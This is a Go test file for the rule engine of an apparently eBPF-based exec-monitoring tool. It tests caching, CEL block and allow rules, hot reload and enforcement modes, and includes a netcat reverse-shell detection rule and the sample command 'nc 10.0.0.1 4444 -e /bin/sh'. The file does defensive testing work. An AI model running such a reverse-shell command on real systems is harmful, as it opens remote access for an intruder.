package engine

import (
	"context"
	"crypto/sha256"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/rs/zerolog"

	zaskebpf "github.com/CrlsMrls/zask/internal/ebpf"
)

// tmpScriptBlockRules is a reusable rule YAML for tests that need a
// BLOCK rule matching scripts executed from /tmp.
const tmpScriptBlockRules = `
rules:
  - name: tmp-script-block
    condition: 'script_path.startsWith("/tmp/")'
    action: BLOCK
    severity: high
`

// makeEventWithArgv creates a ZaskEvent with the given argv string.
func makeEventWithArgv(argv string) zaskebpf.ZaskEvent {
	var ev zaskebpf.ZaskEvent
	for i := 0; i < len(argv) && i < len(ev.Argv); i++ {
		ev.Argv[i] = int8(argv[i])
	}
	// Use a deterministic hash derived from argv so that tests exercising the
	// Tier 1 cache work correctly: same argv → same hash → same cache entry.
	ev.HashAvailable = 1
	h := sha256.Sum256([]byte(argv))
	copy(ev.Hash[:], h[:])
	return ev
}

// makeEventWithScriptArgv creates a ZaskEvent with both argv and script_argv.
func makeEventWithScriptArgv(argv, script string) zaskebpf.ZaskEvent {
	ev := makeEventWithArgv(argv)
	for i := 0; i < len(script) && i < len(ev.ScriptArgv); i++ {
		ev.ScriptArgv[i] = int8(script[i])
	}
	return ev
}

func TestContentCache_HitAndMiss(t *testing.T) {
	cache := NewContentCache(100, 5*time.Minute)

	var key zaskebpf.ZaskExecKey
	key.ChildHash[0] = 0x12
	key.ChildHash[31] = 0x34

	if cache.Contains(key) {
		t.Error("Contains() = true for empty cache, want false")
	}

	cache.Add(key)
	if !cache.Contains(key) {
		t.Error("Contains() = false after Add(), want true")
	}
}

func TestContentCache_Expiration(t *testing.T) {
	cache := NewContentCache(100, 10*time.Millisecond)

	var key zaskebpf.ZaskExecKey
	key.ChildHash[0] = 0xAB
	cache.Add(key)

	if !cache.Contains(key) {
		t.Fatal("Contains() = false immediately after Add()")
	}

	time.Sleep(20 * time.Millisecond)

	if cache.Contains(key) {
		t.Error("Contains() = true after TTL expired, want false")
	}
}

func TestContentCache_KeyedByHash(t *testing.T) {
	cache := NewContentCache(100, 5*time.Minute)

	var key1 zaskebpf.ZaskExecKey
	key1.ChildHash[0] = 0x01
	var key2 zaskebpf.ZaskExecKey
	key2.ChildHash[0] = 0x02

	cache.Add(key1)

	if !cache.Contains(key1) {
		t.Error("Contains(key1) = false, want true")
	}
	if cache.Contains(key2) {
		t.Error("Contains(key2) = true, want false (different hash)")
	}
}

func TestContentCache_EvictionAtCapacity(t *testing.T) {
	cache := NewContentCache(2, 5*time.Minute)

	var k1, k2, k3 zaskebpf.ZaskExecKey
	k1.ChildHash[0] = 1
	k2.ChildHash[0] = 2
	k3.ChildHash[0] = 3

	cache.Add(k1)
	cache.Add(k2)
	cache.Add(k3)

	if cache.Size() > 2 {
		t.Errorf("Size() = %d, want <= 2", cache.Size())
	}
}

func TestRuleEngine_MatchKnownMalicious(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: reverse-shell-netcat
    description: "Detects netcat reverse shells"
    condition: 'argv.contains("nc") && argv.contains("-e") && (argv.contains("/bin/sh") || argv.contains("/bin/bash"))'
    action: BLOCK
    severity: critical
`
	if err := re.LoadFromBytes([]byte(rules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ev := makeEventWithArgv("nc 10.0.0.1 4444 -e /bin/sh")
	matched, rule := re.Match(ev)
	if !matched {
		t.Error("Match() = false for malicious command, want true")
	}
	if rule.Name != "reverse-shell-netcat" {
		t.Errorf("rule.Name = %q, want %q", rule.Name, "reverse-shell-netcat")
	}
	if rule.Action != "BLOCK" {
		t.Errorf("rule.Action = %q, want %q", rule.Action, "BLOCK")
	}
}

func TestRuleEngine_NoMatchNormalCommand(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: reverse-shell-netcat
    condition: 'argv.contains("nc") && argv.contains("-e") && argv.contains("/bin/sh")'
    action: BLOCK
    severity: critical
`
	if err := re.LoadFromBytes([]byte(rules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ev := makeEventWithArgv("/usr/bin/ls -la /tmp")
	matched, _ := re.Match(ev)
	if matched {
		t.Error("Match() = true for normal command, want false")
	}
}

func TestRuleEngine_CELCondition(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: root-netcat
    description: "Blocks netcat when run by root"
    condition: 'argv.contains("nc") && uid == 0'
    action: BLOCK
    severity: critical
`
	if err := re.LoadFromBytes([]byte(rules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	// Should match: root running nc
	ev := makeEventWithArgv("/usr/bin/nc")
	ev.Uid = 0
	matched, rule := re.Match(ev)
	if !matched {
		t.Error("CEL Match() = false for root nc, want true")
	}
	if rule.Name != "root-netcat" {
		t.Errorf("rule.Name = %q, want %q", rule.Name, "root-netcat")
	}

	// Should NOT match: non-root running nc
	ev2 := makeEventWithArgv("/usr/bin/nc")
	ev2.Uid = 1000
	matched2, _ := re.Match(ev2)
	if matched2 {
		t.Error("CEL Match() = true for uid=1000 nc, want false")
	}
}

func TestRuleEngine_CELWithScriptPath(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	if err := re.LoadFromBytes([]byte(tmpScriptBlockRules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ev := makeEventWithScriptArgv("/usr/bin/python3", "/tmp/evil.py")
	matched, _ := re.Match(ev)
	if !matched {
		t.Error("CEL Match() = false for /tmp script, want true")
	}

	ev2 := makeEventWithScriptArgv("/usr/bin/python3", "/opt/app/main.py")
	matched2, _ := re.Match(ev2)
	if matched2 {
		t.Error("CEL Match() = true for /opt script, want false")
	}
}

func TestRuleEngine_InvalidCEL(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: bad-cel
    condition: '!!!invalid expression'
    action: BLOCK
    severity: high
`
	if err := re.LoadFromBytes([]byte(rules)); err == nil {
		t.Error("LoadFromBytes() expected error for invalid CEL, got nil")
	}
}

func TestRuleEngine_MissingCondition(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: empty-rule
    action: BLOCK
    severity: high
`
	if err := re.LoadFromBytes([]byte(rules)); err == nil {
		t.Error("LoadFromBytes() expected error for rule with no condition, got nil")
	}
}

func TestRuleEngine_HotReload(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)
	defer re.Close()

	dir := t.TempDir()
	rulesPath := filepath.Join(dir, "rules.yaml")

	initial := `
rules:
  - name: test-rule-1
    condition: 'argv.contains("test_pattern_1")'
    action: BLOCK
    severity: high
`
	if err := os.WriteFile(rulesPath, []byte(initial), 0o644); err != nil {
		t.Fatalf("write rules file: %v", err)
	}

	if err := re.LoadFromFile(rulesPath); err != nil {
		t.Fatalf("LoadFromFile() error = %v", err)
	}

	if err := re.WatchFile(rulesPath); err != nil {
		t.Fatalf("WatchFile() error = %v", err)
	}

	updated := `
rules:
  - name: test-rule-1
    condition: 'argv.contains("test_pattern_1")'
    action: BLOCK
    severity: high
  - name: test-rule-2
    condition: 'argv.contains("new_hot_reload")'
    action: ALERT
    severity: medium
`
	if err := os.WriteFile(rulesPath, []byte(updated), 0o644); err != nil {
		t.Fatalf("write updated rules file: %v", err)
	}

	time.Sleep(500 * time.Millisecond)

	ev := makeEventWithArgv("new_hot_reload here")
	matched, rule := re.Match(ev)
	if !matched {
		t.Error("Match() = false for hot-reloaded rule, want true")
	}
	if rule.Name != "test-rule-2" {
		t.Errorf("rule.Name = %q, want %q", rule.Name, "test-rule-2")
	}
}

func TestRuleEngine_ConditionRequired(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	rules := `
rules:
  - name: no-condition
    action: BLOCK
    severity: high
`
	if err := re.LoadFromBytes([]byte(rules)); err == nil {
		t.Error("LoadFromBytes() expected error for missing condition, got nil")
	}
}

func TestEngine_MonitorModeNoEnforcement(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 10,
		RateBurst: 20,
		AIQueue:   aiQueue,
		Mode:      ModeMonitor,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	// In monitor mode, enforce() should log but not kill or block.
	// We verify this by passing an event through the engine with a BLOCK rule.
	rulesYAML := `
rules:
  - name: test-block
    condition: 'argv.contains("nc")'
    action: BLOCK
    severity: critical
`
	if err := eng.rules.LoadFromBytes([]byte(rulesYAML)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ev := makeEventWithArgv("/usr/bin/nc")
	ev.Pid = 99999 // Non-existent PID; if SIGKILL were sent, it would error silently.
	verdict := eng.Process(context.Background(), ev)

	if verdict.Action != ActionBlock {
		t.Errorf("Action = %v, want ActionBlock (logged but not enforced)", verdict.Action)
	}
	if verdict.Tier != 2 {
		t.Errorf("Tier = %d, want 2", verdict.Tier)
	}
}

func TestBuildInterpreterSet_BareNames(t *testing.T) {
	set := buildInterpreterSet([]string{"python3", "bash", "node"})

	for _, name := range []string{"python3", "bash", "node"} {
		if !set[name] {
			t.Errorf("set[%q] = false, want true", name)
		}
	}
	if set["ruby"] {
		t.Error("set[\"ruby\"] = true, want false")
	}
}

func TestBuildInterpreterSet_FullPaths(t *testing.T) {
	set := buildInterpreterSet([]string{"/usr/bin/python3", "/usr/local/bin/node"})

	if !set["python3"] {
		t.Error("set[\"python3\"] = false, want true (resolved from /usr/bin/python3)")
	}
	if !set["node"] {
		t.Error("set[\"node\"] = false, want true (resolved from /usr/local/bin/node)")
	}
	if set["/usr/bin/python3"] {
		t.Error("set[\"/usr/bin/python3\"] = true, want false (should store basename only)")
	}
}

func TestBuildInterpreterSet_MixedEntries(t *testing.T) {
	set := buildInterpreterSet([]string{"ruby", "/usr/bin/python3", "bash"})

	for _, name := range []string{"ruby", "python3", "bash"} {
		if !set[name] {
			t.Errorf("set[%q] = false, want true", name)
		}
	}
	if len(set) != 3 {
		t.Errorf("len(set) = %d, want 3", len(set))
	}
}

func TestEngine_CustomInterpreters(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit:    10,
		RateBurst:    20,
		AIQueue:      aiQueue,
		Interpreters: []string{"/usr/bin/python3", "ruby"},
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	if !eng.interpreters["python3"] {
		t.Error("interpreters[\"python3\"] = false, want true")
	}
	if !eng.interpreters["ruby"] {
		t.Error("interpreters[\"ruby\"] = false, want true")
	}
	// bash should NOT be in the set since we provided a custom list.
	if eng.interpreters["bash"] {
		t.Error("interpreters[\"bash\"] = true, want false (custom list used)")
	}
}

func TestEngine_DefaultInterpreters(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 10,
		RateBurst: 20,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	for _, name := range defaultInterpreters {
		if !eng.interpreters[name] {
			t.Errorf("default interpreters[%q] = false, want true", name)
		}
	}
}

func TestEngine_RateLimiterDropsExcess(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 2,
		RateBurst: 2,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	ctx := context.Background()

	var aiCount int
	for i := 0; i < 20; i++ {
		ev := zaskebpf.ZaskEvent{
			InodeNumber: uint64(1000 + i),
			DeviceId:    1,
			Pid:         uint32(i + 100),
		}
		verdict := eng.Process(ctx, ev)
		if verdict.Action == ActionAIQueue {
			aiCount++
		}
	}

	if aiCount > 5 {
		t.Errorf("AI queue received %d events, expected at most ~burst (2-5)", aiCount)
	}
	if aiCount == 0 {
		t.Error("AI queue received 0 events, expected at least some")
	}
}

// =========================================================================
// Bug fix: Cache invalidation on rule reload
// =========================================================================

func TestContentCache_Clear(t *testing.T) {
	cache := NewContentCache(100, 5*time.Minute)

	// Populate the cache.
	for i := range 10 {
		var k zaskebpf.ZaskExecKey
		k.ChildHash[0] = byte(i)
		cache.Add(k)
	}
	if cache.Size() != 10 {
		t.Fatalf("Size() = %d, want 10", cache.Size())
	}

	cache.Clear()

	if cache.Size() != 0 {
		t.Errorf("Size() = %d after Clear(), want 0", cache.Size())
	}

	// Previously-cached keys must miss.
	for i := range 10 {
		var k zaskebpf.ZaskExecKey
		k.ChildHash[0] = byte(i)
		if cache.Contains(k) {
			t.Errorf("Contains(child_hash[0]=%d) = true after Clear(), want false", i)
		}
	}
}

func TestContentCache_ClearThenReuse(t *testing.T) {
	cache := NewContentCache(100, 5*time.Minute)

	var k, k2 zaskebpf.ZaskExecKey
	k.ChildHash[0] = 0x42
	k2.ChildHash[0] = 0x63

	cache.Add(k)
	cache.Clear()

	// After clearing, we should be able to add and find new entries.
	cache.Add(k2)

	if !cache.Contains(k2) {
		t.Error("Contains(k2) = false after re-add, want true")
	}
	if cache.Contains(k) {
		t.Error("Contains(k) = true after Clear() + different add, want false")
	}
}

func TestRuleEngine_OnReloadCallback(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	called := false
	re.onReload = func() { called = true }

	rules := `
rules:
  - name: trigger-reload
    condition: 'argv.contains("test")'
    action: BLOCK
    severity: low
`
	if err := re.LoadFromBytes([]byte(rules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	if !called {
		t.Error("onReload callback was NOT called after LoadFromBytes()")
	}
}

// =========================================================================
// Phase 3b: Kernel fast-path promotion tests
// =========================================================================

// mockLoader records calls to AllowExec and BlockExec for unit testing.
type mockLoader struct {
	allowed []zaskebpf.ZaskExecKey
	blocked []zaskebpf.ZaskExecKey
}

func (m *mockLoader) AllowExec(key zaskebpf.ZaskExecKey) error {
	m.allowed = append(m.allowed, key)
	return nil
}

func (m *mockLoader) BlockExec(key zaskebpf.ZaskExecKey) error {
	m.blocked = append(m.blocked, key)
	return nil
}

// makeEventWithHash creates a ZaskEvent with HashAvailable=1 and the given
// hash byte set at position 0. Used to test hash-based verdict map writes.
func makeEventWithHash(hashByte byte) zaskebpf.ZaskEvent {
	var ev zaskebpf.ZaskEvent
	ev.HashAvailable = 1
	ev.Hash[0] = hashByte
	return ev
}

// TestEngine_AllowHash_OnNullRuleMatch verifies that when an event matches
// no rule (cache miss, Tier 2 pass-through), the engine calls AllowExec on
// the loader to promote the exec chain to the kernel fast-path (T3c.5).
func TestEngine_AllowHash_OnNullRuleMatch(t *testing.T) {
	log := zerolog.Nop()
	ml := &mockLoader{}

	eng, err := New(EngineOptions{
		RateLimit: 10,
		RateBurst: 100,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()
	eng.loader = ml

	ev := makeEventWithHash(0x42)
	ev.Pid = 100
	for i := 0; i < len("/usr/bin/ls"); i++ {
		ev.Argv[i] = int8("/usr/bin/ls"[i])
	}

	eng.Process(context.Background(), ev)

	if len(ml.allowed) == 0 {
		t.Fatal("AllowExec was NOT called for a no-rule-match event")
	}
	var want zaskebpf.ZaskExecKey
	want.ChildHash[0] = 0x42
	if ml.allowed[0] != want {
		t.Errorf("AllowExec called with child_hash %x, want %x", ml.allowed[0].ChildHash, want.ChildHash)
	}
	if len(ml.blocked) != 0 {
		t.Errorf("BlockExec called %d times, want 0", len(ml.blocked))
	}
}

// TestEngine_AllowHash_OnAllowRuleMatch verifies that an explicit ALLOW rule
// triggers AllowExec to promote the exec chain to the kernel fast-path (T3c.5).
func TestEngine_AllowHash_OnAllowRuleMatch(t *testing.T) {
	log := zerolog.Nop()
	ml := &mockLoader{}

	eng, err := New(EngineOptions{
		RateLimit: 10,
		RateBurst: 100,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()
	eng.loader = ml

	allowRule := `
rules:
  - name: allow-ls
    condition: 'argv.contains("/usr/bin/ls")'
    action: ALLOW
    severity: low
`
	if err := eng.rules.LoadFromBytes([]byte(allowRule)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ev := makeEventWithHash(0x99)
	ev.Pid = 200
	for i := 0; i < len("/usr/bin/ls"); i++ {
		ev.Argv[i] = int8("/usr/bin/ls"[i])
	}

	verdict := eng.Process(context.Background(), ev)

	if verdict.Action != ActionAllow {
		t.Errorf("Action = %v, want ActionAllow", verdict.Action)
	}
	if len(ml.allowed) == 0 {
		t.Fatal("AllowExec was NOT called for an ALLOW rule match")
	}
	var want zaskebpf.ZaskExecKey
	want.ChildHash[0] = 0x99
	if ml.allowed[0] != want {
		t.Errorf("AllowExec called with child_hash %x, want %x", ml.allowed[0].ChildHash, want.ChildHash)
	}
	if len(ml.blocked) != 0 {
		t.Errorf("BlockExec called %d times on ALLOW rule, want 0", len(ml.blocked))
	}
}

// TestEngine_NoAllowHash_OnBlockRuleMatch verifies that a BLOCK rule triggers
// only BlockExec, never AllowExec (T3c.10).
func TestEngine_NoAllowHash_OnBlockRuleMatch(t *testing.T) {
	log := zerolog.Nop()
	ml := &mockLoader{}

	eng, err := New(EngineOptions{
		RateLimit: 10,
		RateBurst: 100,
		Mode:      ModeLockdown,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()
	eng.loader = ml

	blockRule := `
rules:
  - name: block-nc
    condition: 'argv.contains("nc")'
    action: BLOCK
    severity: critical
`
	if err := eng.rules.LoadFromBytes([]byte(blockRule)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ev := makeEventWithHash(0x55)
	ev.Pid = 99999
	for i := 0; i < len("/usr/bin/nc"); i++ {
		ev.Argv[i] = int8("/usr/bin/nc"[i])
	}

	verdict := eng.Process(context.Background(), ev)

	if verdict.Action != ActionBlock {
		t.Errorf("Action = %v, want ActionBlock", verdict.Action)
	}
	if len(ml.allowed) != 0 {
		t.Errorf("AllowExec called %d times on BLOCK rule, want 0", len(ml.allowed))
	}
	if len(ml.blocked) == 0 {
		t.Fatal("BlockExec was NOT called for a BLOCK rule match")
	}
	var want zaskebpf.ZaskExecKey
	want.ChildHash[0] = 0x55
	if ml.blocked[0] != want {
		t.Errorf("BlockExec called with child_hash %x, want %x", ml.blocked[0].ChildHash, want.ChildHash)
	}
}

func TestRuleEngine_OnReloadNotCalledOnError(t *testing.T) {
	log := zerolog.Nop()
	re := NewRuleEngine(log)

	called := false
	re.onReload = func() { called = true }

	// Invalid CEL — LoadFromBytes should fail.
	badRules := `
rules:
  - name: bad
    condition: '!!!invalid'
    action: BLOCK
    severity: low
`
	if err := re.LoadFromBytes([]byte(badRules)); err == nil {
		t.Fatal("LoadFromBytes() expected error, got nil")
	}

	if called {
		t.Error("onReload was called despite LoadFromBytes() returning an error")
	}
}

func TestEngine_CacheClearedOnRuleReload(t *testing.T) {
	// This tests the integrated behavior:
	// 1. Engine caches an inode as ALLOW (no matching rule)
	// 2. Rules are reloaded  (adding a rule that would match)
	// 3. Cache should be cleared so the inode is re-evaluated
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 100,
		RateBurst: 200,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	ctx := context.Background()

	// Step 1: Process an event — no rules loaded, so it's cached as ALLOW.
	ev := zaskebpf.ZaskEvent{
		InodeNumber: 555,
		DeviceId:    1,
		Pid:         99999,
	}
	for i := 0; i < len("/usr/bin/suspicious") && i < len(ev.Argv); i++ {
		ev.Argv[i] = int8("/usr/bin/suspicious"[i])
	}
	// Set a stable hash so the cache can store and retrieve this event.
	ev.HashAvailable = 1
	knownHash := sha256.Sum256([]byte("/usr/bin/suspicious"))
	copy(ev.Hash[:], knownHash[:])
	v1 := eng.Process(ctx, ev)
	if v1.Tier != 3 {
		t.Fatalf("first pass: Tier = %d, want 3 (AI queue / no rule match)", v1.Tier)
	}

	// Step 2: Same inode → should hit Tier 1 cache.
	ev2 := ev // same inode
	ev2.Pid = 99998
	v2 := eng.Process(ctx, ev2)
	if v2.Tier != 1 {
		t.Fatalf("second pass: Tier = %d, want 1 (cache hit)", v2.Tier)
	}

	// Step 3: Reload rules to add a BLOCK rule matching this binary.
	newRules := `
rules:
  - name: block-suspicious
    condition: 'argv.contains("suspicious")'
    action: BLOCK
    severity: critical
`
	if err := eng.rules.LoadFromBytes([]byte(newRules)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	// Step 4: Same inode again — cache should be cleared, Tier 2 should match.
	ev3 := ev
	ev3.Pid = 99997
	v3 := eng.Process(ctx, ev3)
	if v3.Tier != 2 {
		t.Errorf("after reload: Tier = %d, want 2 (rule match)", v3.Tier)
	}
	if v3.Action != ActionBlock {
		t.Errorf("after reload: Action = %v, want ActionBlock", v3.Action)
	}
	if v3.RuleName != "block-suspicious" {
		t.Errorf("after reload: RuleName = %q, want %q", v3.RuleName, "block-suspicious")
	}
}

// =========================================================================
// ALLOW rule action: explicit allowlist with cache insertion
// =========================================================================

func TestEngine_AllowRuleCachesAndSkipsTier3(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 100,
		RateBurst: 200,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	rulesYAML := `
rules:
  - name: allow-system-bins
    condition: 'argv.startsWith("/usr/bin/")'
    action: ALLOW
    severity: low
`
	if err := eng.rules.LoadFromBytes([]byte(rulesYAML)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ctx := context.Background()

	ev := makeEventWithArgv("/usr/bin/ls")
	ev.InodeNumber = 500
	ev.DeviceId = 1
	ev.Pid = 99999

	v := eng.Process(ctx, ev)
	if v.Action != ActionAllow {
		t.Errorf("Action = %v, want ActionAllow", v.Action)
	}
	if v.Tier != 2 {
		t.Errorf("Tier = %d, want 2 (rule match)", v.Tier)
	}
	if v.RuleName != "allow-system-bins" {
		t.Errorf("RuleName = %q, want %q", v.RuleName, "allow-system-bins")
	}

	// Should NOT have been routed to AI queue.
	select {
	case <-aiQueue:
		t.Error("ALLOW event was routed to AI queue (should be skipped)")
	default:
		// Good — no AI queue event.
	}

	// Second call: inode should now be in Tier 1 cache.
	ev2 := makeEventWithArgv("/usr/bin/ls")
	ev2.InodeNumber = 500
	ev2.DeviceId = 1
	ev2.Pid = 99998
	v2 := eng.Process(ctx, ev2)
	if v2.Tier != 1 {
		t.Errorf("second call: Tier = %d, want 1 (cache hit from ALLOW rule)", v2.Tier)
	}
}

func TestEngine_AllowRuleDoesNotBlockOrKill(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 100,
		RateBurst: 200,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	rulesYAML := `
rules:
  - name: allow-curl
    condition: 'argv.contains("curl")'
    action: ALLOW
    severity: low
  - name: block-all
    condition: 'true'
    action: BLOCK
    severity: critical
`
	if err := eng.rules.LoadFromBytes([]byte(rulesYAML)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ctx := context.Background()

	// curl matches the ALLOW rule first, not the catch-all BLOCK.
	ev := makeEventWithArgv("/usr/bin/curl")
	ev.InodeNumber = 600
	ev.DeviceId = 1
	ev.Pid = 99999

	v := eng.Process(ctx, ev)
	if v.Action != ActionAllow {
		t.Errorf("Action = %v, want ActionAllow (ALLOW rule should win over BLOCK)", v.Action)
	}

	// A non-curl binary should hit the BLOCK rule.
	ev2 := makeEventWithArgv("/usr/bin/wget")
	ev2.InodeNumber = 601
	ev2.DeviceId = 1
	ev2.Pid = 99998

	v2 := eng.Process(ctx, ev2)
	if v2.Action != ActionBlock {
		t.Errorf("Action = %v, want ActionBlock (catch-all should block wget)", v2.Action)
	}
}

// TestEngine_HashUnavailable_RulesEvaluate_NoLoaderCall verifies T3c.6:
// when HashAvailable==0 (IMA not configured), rules are still evaluated but
// no AllowExec or BlockExec call is made on the loader (no valid key to write).
func TestEngine_HashUnavailable_RulesEvaluate_NoLoaderCall(t *testing.T) {
	log := zerolog.Nop()
	ml := &mockLoader{}

	eng, err := New(EngineOptions{
		RateLimit: 10,
		RateBurst: 100,
		Mode:      ModeLockdown,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()
	eng.loader = ml

	blockRule := `
rules:
  - name: block-nc
    condition: 'argv.contains("nc")'
    action: BLOCK
    severity: critical
`
	if err := eng.rules.LoadFromBytes([]byte(blockRule)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	// Event with HashAvailable=0 (IMA not configured).
	var ev zaskebpf.ZaskEvent
	ev.Pid = 1234
	for i, b := range []byte("/usr/bin/nc") {
		ev.Argv[i] = int8(b)
	}
	// HashAvailable is 0 by default (zero value).

	verdict := eng.Process(context.Background(), ev)

	// Rule should still match.
	if verdict.Action != ActionBlock {
		t.Errorf("Action = %v, want ActionBlock (rules still evaluate without hash)", verdict.Action)
	}
	if verdict.Tier != 2 {
		t.Errorf("Tier = %d, want 2", verdict.Tier)
	}
	// No loader calls — we have no valid hash key.
	if len(ml.blocked) != 0 {
		t.Errorf("BlockExec called %d times with no hash, want 0", len(ml.blocked))
	}
	if len(ml.allowed) != 0 {
		t.Errorf("AllowExec called %d times with no hash, want 0", len(ml.allowed))
	}
}

// TestEngine_ScriptIdentityUsesInterpreterHash verifies that for interpreter
// events the exec-chain key uses the interpreter's hash (child_hash), NOT the
// script file's hash. Script content analysis is handled by Tier 2 CEL rules
// via the script_path field (§ADR-exec-chain).
func TestEngine_ScriptIdentityUsesInterpreterHash(t *testing.T) {
	dir := t.TempDir()
	scriptPath := filepath.Join(dir, "test.py")
	content := []byte("print('hello world')")
	if err := os.WriteFile(scriptPath, content, 0o644); err != nil {
		t.Fatalf("create script file: %v", err)
	}

	log := zerolog.Nop()
	ml := &mockLoader{}
	eng, err := New(EngineOptions{RateLimit: 10, RateBurst: 100}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()
	eng.loader = ml

	// python3 event: interpreter hash byte 0xAB, script path in ScriptArgv.
	// PID 99999 is non-existent — FindScriptPath returns "", falls back to ScriptArgv.
	ev := makeEventWithHash(0xAB)
	ev.Pid = 99999
	for i, b := range []byte("/usr/bin/python3") {
		ev.Argv[i] = int8(b)
	}
	for i, b := range []byte(scriptPath) {
		ev.ScriptArgv[i] = int8(b)
	}

	eng.Process(context.Background(), ev)

	if len(ml.allowed) == 0 {
		t.Fatal("AllowExec was not called for interpreter event")
	}

	// The exec-chain key must use the interpreter's hash (0xAB), not the script hash.
	var want zaskebpf.ZaskExecKey
	want.ChildHash[0] = 0xAB // interpreter hash — set by makeEventWithHash
	// want.ParentHash is all-zeros (unknown parent sentinel)
	if ml.allowed[0].ChildHash[0] != want.ChildHash[0] {
		t.Errorf("AllowExec child_hash[0] = %x, want interpreter hash %x (not script hash)",
			ml.allowed[0].ChildHash[0], want.ChildHash[0])
	}
}

// TestEngine_BlockBeforeAllowOrdering verifies the recommended production
// pattern: specific BLOCK rules before a broad ALLOW catchall. This is the
// rule ordering documented in configuration.md — a specific BLOCK for a
// path that also matches the broad ALLOW catchall must win.
func TestEngine_BlockBeforeAllowOrdering(t *testing.T) {
	log := zerolog.Nop()
	aiQueue := make(chan zaskebpf.ZaskEvent, 100)

	eng, err := New(EngineOptions{
		RateLimit: 100,
		RateBurst: 200,
		AIQueue:   aiQueue,
	}, log)
	if err != nil {
		t.Fatalf("New() error = %v", err)
	}
	defer eng.Close()

	// Recommended ordering: BLOCK first, ALLOW catchall last.
	rulesYAML := `
rules:
  - name: block-netcat
    condition: 'argv.contains("nc")'
    action: BLOCK
    severity: critical
  - name: allow-system-bins
    condition: 'argv.startsWith("/usr/bin/")'
    action: ALLOW
    severity: low
`
	if err := eng.rules.LoadFromBytes([]byte(rulesYAML)); err != nil {
		t.Fatalf("LoadFromBytes() error = %v", err)
	}

	ctx := context.Background()

	// /usr/bin/nc matches BOTH rules, but BLOCK comes first → blocked.
	ev := makeEventWithArgv("/usr/bin/nc")
	ev.InodeNumber = 700
	ev.DeviceId = 1
	ev.Pid = 88888
	v := eng.Process(ctx, ev)
	if v.Action != ActionBlock {
		t.Errorf("nc: Action = %v, want ActionBlock (BLOCK before ALLOW)", v.Action)
	}
	if v.RuleName != "block-netcat" {
		t.Errorf("nc: RuleName = %q, want %q", v.RuleName, "block-netcat")
	}

	// /usr/bin/ls only matches the ALLOW catchall → allowed.
	ev2 := makeEventWithArgv("/usr/bin/ls")
	ev2.InodeNumber = 701
	ev2.DeviceId = 1
	ev2.Pid = 88887
	v2 := eng.Process(ctx, ev2)
	if v2.Action != ActionAllow {
		t.Errorf("ls: Action = %v, want ActionAllow (ALLOW catchall)", v2.Action)
	}
}

func TestEngine_AllowRuleStringOutput(t *testing.T) {
	if ActionAllow.String() != "ALLOW" {
		t.Errorf("ActionAllow.String() = %q, want %q", ActionAllow.String(), "ALLOW")
	}
}

// =========================================================================
// Bug fix: Script/interpreter detection
